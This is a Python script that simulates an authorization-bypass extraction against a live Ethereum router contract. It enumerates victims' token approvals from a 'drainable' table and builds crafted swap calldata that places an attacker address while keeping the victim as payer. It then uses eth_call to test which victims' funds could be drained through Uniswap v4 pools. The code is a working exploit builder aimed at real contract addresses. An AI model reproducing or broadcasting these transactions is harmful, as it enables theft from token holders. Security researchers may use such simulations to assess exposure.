#!/usr/bin/env python3
"""
sim_extract.py — read-only end-to-end simulation of the auth-bypass extraction for every
distinct (token, owner) approval pair, using eth_call (nothing is broadcast).

For each candidate it builds the non-canonical `swap(bytes,uint256)` calldata (offset word 0xc0,
attacker planted at absolute calldata offset 164, real BaseData.payer = victim) and simulates the
call against the live chain. A call only succeeds if (a) the auth gate is bypassed, (b) the token's
transferFrom works from the router and returns >=32 bytes (USDT returns 0 bytes and makes the
router's ABI decode revert), (c) a liquid v4 pool exists for the token, and (d) any hook allows it.

Etherscan V2 key + RPC come from the environment; never written to disk.
"""
import os, json, time, urllib.request, urllib.parse

EK = os.environ.get("ETHERSCANV2_API_KEY", "")
RPC = os.environ.get("RPC") or os.environ.get("NODEREAL_ETH_RPC_URL") or os.environ.get("RPC_URL")
ROUTER = "0x00000000000044a361ae3cac094c9d1b14eece97"
PM = "0x000000000004444c5dc75cb358380d2e3de08a90"
ATTACKER = "0x00000000000000000000000000000000deadbeef"
INIT_TOPIC0 = "0xdd466e674ea557f56295e2d0218a125ea4b4f0f6f3307b95f85e6110838d6438"


def rpc(m, p):
    req = urllib.request.Request(RPC, data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": m, "params": p}).encode(),
                                 headers={"content-type": "application/json"})
    return json.load(urllib.request.urlopen(req, timeout=90))


def es(params):
    p = dict(params); p["chainid"] = 1; p["apikey"] = EK
    return json.load(urllib.request.urlopen("https://api.etherscan.io/v2/api?" + urllib.parse.urlencode(p), timeout=90))


def w(x):
    return int(x, 16).to_bytes(32, "big")


def addr(a):
    return bytes.fromhex(a[2:].rjust(64, "0"))


def poolkey(pool_id):
    """Read the PoolKey of a v4 pool from the PoolManager Initialize event."""
    r = es({"module": "logs", "action": "getLogs", "address": PM, "fromBlock": 0, "toBlock": "latest",
            "topic0": INIT_TOPIC0, "topic1": pool_id})
    res = r.get("result")
    if not isinstance(res, list) or not res:
        return None
    l = res[0]
    d = l["data"][2:]
    words = [d[i:i + 64] for i in range(0, len(d), 64)]
    fee = int(words[0], 16)
    ts = int(words[1], 16)
    hooks = "0x" + words[2][-40:]
    c0 = "0x" + l["topics"][2][-40:]
    c1 = "0x" + l["topics"][3][-40:]
    return {"c0": c0, "c1": c1, "fee": fee, "ts": ts, "hooks": hooks}


def build(token, owner, amount, pk):
    zero_for_one = pk["c0"].lower() == token.lower()
    content = w(hex(amount)) + w("0x0") + addr(owner) + addr(ATTACKER) + w("0x1")
    content += w("0x1" if zero_for_one else "0x0")
    content += addr(pk["c0"]) + addr(pk["c1"]) + w(hex(pk["fee"])) + w(hex(pk["ts"])) + addr(pk["hooks"])
    content += w(hex(0x180)) + w("0x0")
    cd = bytearray()
    cd += bytes.fromhex("af2b4aba")
    cd += w(hex(0xc0)) + w(hex((1 << 256) - 1)) + bytes(0xc0 - 32)
    cd[164:196] = addr(ATTACKER)
    cd += w(hex(len(content))) + content
    return "0x" + cd.hex()


def main():
    table = json.load(open("drainable_table.json"))
    pools = json.load(open("gecko_pools_full.json"))
    rows = []
    for r in table["rows"]:
        tok = r["token"]
        plist = pools.get(tok) or []
        # pick the highest-liquidity v4 pool
        best = None
        for p in plist:
            if isinstance(p, dict) and p.get("dex") == "uniswap-v4-ethereum":
                if best is None or float(p.get("liq") or 0) > float(best.get("liq") or 0):
                    best = p
        out = {"token": tok, "symbol": r["symbol"], "owner": r["owner"], "amount_raw": r["drainable_raw"],
               "amount_tokens": r["drainable_tokens"], "usd": r["usd"], "pool_id": best.get("addr") if best else None,
               "pool_liq": best.get("liq") if best else None}
        if best:
            pk = poolkey(best["addr"])
            time.sleep(0.4)
            out["pool_key"] = pk
            if pk:
                try:
                    res = rpc("eth_call", [{"from": ATTACKER, "to": ROUTER, "data": build(tok, r["owner"], r["drainable_raw"], pk)}, "latest"])
                    out["call_ok"] = "result" in res
                    out["call_err"] = None if "result" in res else str(res.get("error", {}).get("data"))
                except Exception as e:
                    out["call_ok"] = False
                    out["call_err"] = str(e)[:80]
            else:
                out["call_ok"] = None
        rows.append(out)
        print(f"{r['symbol']:>12} usd={str(r['usd'])[:9]:>9} pool={out['pool_id']} liq={out['pool_liq']} "
              f"call_ok={out.get('call_ok')} err={out.get('call_err')}", flush=True)
    json.dump(rows, open("sim_extract.json", "w"), indent=1)


if __name__ == "__main__":
    main()
